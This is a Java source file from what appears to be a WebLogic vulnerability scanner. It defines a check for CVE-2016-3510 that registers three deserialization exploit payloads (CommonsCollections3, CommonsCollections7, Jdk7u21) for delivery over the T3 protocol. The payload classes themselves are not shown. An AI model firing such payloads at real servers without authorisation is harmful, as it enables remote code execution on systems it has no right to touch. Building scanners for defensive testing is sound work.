package com.gbw.scanner.plugins.scripts.weblogic.vuls;

import com.gbw.scanner.plugins.scripts.weblogic.GBWScanWeblogicConfig;
import com.gbw.scanner.plugins.scripts.weblogic.payload.GBWCommonsCollections3;
import com.gbw.scanner.plugins.scripts.weblogic.payload.GBWCommonsCollections7;
import com.gbw.scanner.plugins.scripts.weblogic.payload.GBWJdk7u21;
import com.gbw.scanner.plugins.scripts.weblogic.payload.GBWMarshalledObjectEcho;

public class GBWCVE_2016_3510 extends GBWAbstractEchoVul{

    public GBWCVE_2016_3510(GBWScanWeblogicConfig config){

        super(config,"CVE_2016_3510","CVE_2016_3510");
        echoPayloads.add(new GBWMarshalledObjectEcho(new GBWCommonsCollections3()));
        echoPayloads.add(new GBWMarshalledObjectEcho(new GBWCommonsCollections7()));
        echoPayloads.add(new GBWMarshalledObjectEcho(new GBWJdk7u21()));
    }


    @Override
    public String getDefaultProto() {
        return "t3";
    }
}
